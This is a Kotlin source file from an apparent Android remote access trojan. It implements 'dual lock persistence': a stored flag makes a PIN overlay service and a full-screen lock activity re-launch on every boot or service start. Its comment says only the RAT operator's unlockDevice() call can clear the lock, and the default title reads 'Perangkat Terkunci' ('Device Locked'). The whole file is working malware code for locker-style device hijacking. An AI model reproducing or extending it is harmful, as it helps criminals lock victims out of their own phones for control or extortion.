package com.sync.xxx

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat

/**
 * Dual lock persistence.
 * Flag stored in SharedPreferences. On every boot / service start,
 * if flag is set, both lock paths are re-armed:
 *   1) LockOverlayService (PIN overlay)
 *   2) LockNewActivity (full activity lock)
 * Only unlockDevice() from RAT clears the flag.
 */
object LockPersist {
    private const val PREF = "lock_persist_v2"
    private const val KEY_ACTIVE = "active"
    private const val KEY_PIN = "pin"
    private const val KEY_TITLE = "title"
    private const val KEY_MODE = "mode" // "overlay" | "activity" | "both"

    fun setLocked(ctx: Context, pin: String, title: String, mode: String = "both") {
        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
            .putBoolean(KEY_ACTIVE, true)
            .putString(KEY_PIN, pin)
            .putString(KEY_TITLE, title)
            .putString(KEY_MODE, mode)
            .apply()
    }

    fun clear(ctx: Context) {
        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
            .putBoolean(KEY_ACTIVE, false)
            .remove(KEY_PIN)
            .remove(KEY_TITLE)
            .apply()
    }

    fun isLocked(ctx: Context): Boolean {
        return ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            .getBoolean(KEY_ACTIVE, false)
    }

    fun reapply(ctx: Context) {
        val sp = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        if (!sp.getBoolean(KEY_ACTIVE, false)) return
        val pin = sp.getString(KEY_PIN, "") ?: ""
        val title = sp.getString(KEY_TITLE, "Perangkat Terkunci") ?: "Perangkat Terkunci"
        val mode = sp.getString(KEY_MODE, "both") ?: "both"

        try {
            if (mode == "overlay" || mode == "both") {
                val i = Intent(ctx, LockOverlayService::class.java).apply {
                    putExtra(LockOverlayService.EXTRA_PIN, pin)
                    putExtra(LockOverlayService.EXTRA_TITLE, title)
                }
                ContextCompat.startForegroundService(ctx, i)
            }
            if (mode == "activity" || mode == "both") {
                val i = Intent(ctx, LockNewActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    putExtra("pin", pin)
                    putExtra("title", title)
                }
                ctx.startActivity(i)
            }
        } catch (e: Exception) {
            android.util.Log.e("LockPersist", "reapply: ${e.message}")
        }
    }
}
